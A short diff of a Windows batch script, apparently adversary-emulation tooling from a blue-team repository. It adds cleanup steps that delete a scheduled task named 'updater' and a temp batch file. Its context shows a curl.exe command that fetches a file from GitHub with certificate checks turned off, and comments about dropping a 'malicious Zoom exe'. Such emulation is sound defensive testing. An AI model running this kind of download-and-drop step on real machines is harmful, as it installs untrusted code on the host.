@@ -40,6 +40,12 @@ curl.exe -kL https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adv
 ::        change name of zoom exe
 ::        Download malicious Zoom exe to folder
 
+:: Delete Scheduled Task
+schtasks /DELETE /TN updater
+
+:: Delete C:\Windows\Temp\test.bat
+del C:\Windows\Temp\test.bat
+
 :end
 pause
 endlocal
